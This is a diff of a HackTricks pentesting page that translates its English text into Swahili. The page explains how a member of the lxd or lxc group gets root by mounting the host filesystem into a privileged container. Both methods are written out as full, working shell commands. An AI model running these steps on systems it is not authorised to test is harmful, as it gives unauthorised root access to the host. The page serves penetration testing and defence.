@@ -2,14 +2,13 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root
+Ikiwa unahusishwa na _**lxd**_ **au** _**lxc**_ **group**, unaweza kuwa root
 
-## Exploiting without internet
+## Kutumia bila mtandao
 
 ### Method 1
 
-You can install in your machine this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(follow the instructions of the github):
-
+Unaweza kufunga katika mashine yako mjenzi wa distro hii: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(fuata maelekezo ya github):
 ```bash
 sudo su
 # Install requirements
@@ -34,9 +33,7 @@ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ## Using build-lxc
 sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
 ```
-
-Upload the files **lxd.tar.xz** and **rootfs.squashfs**, add the image to the repo and create a container:
-
+Pakia faili **lxd.tar.xz** na **rootfs.squashfs**, ongeza picha kwenye repo na uunde kontena:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -51,23 +48,19 @@ lxc list
 
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
-
 > [!CAUTION]
-> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
-> Run **`lxd init`** and **repeat** the previous chunk of commands
+> Ikiwa unakutana na kosa _**Kosa: Hakuna hifadhi ya kuhifadhi iliyopatikana. Tafadhali tengeneza hifadhi mpya ya kuhifadhi**_\
+> Kimbia **`lxd init`** na **rudia** kipande cha amri kilichopita
 
-Finally you can execute the container and get root:
-
+Hatimaye unaweza kutekeleza kontena na kupata root:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
+### Njia ya 2
 
-### Method 2
-
-Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
-
+Jenga picha ya Alpine na uanze kutumia bendera `security.privileged=true`, ukilazimisha kontena kuingiliana kama root na mfumo wa faili wa mwenyeji.
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -87,5 +80,4 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 ```
-
 {{#include ../../../banners/hacktricks-training.md}}
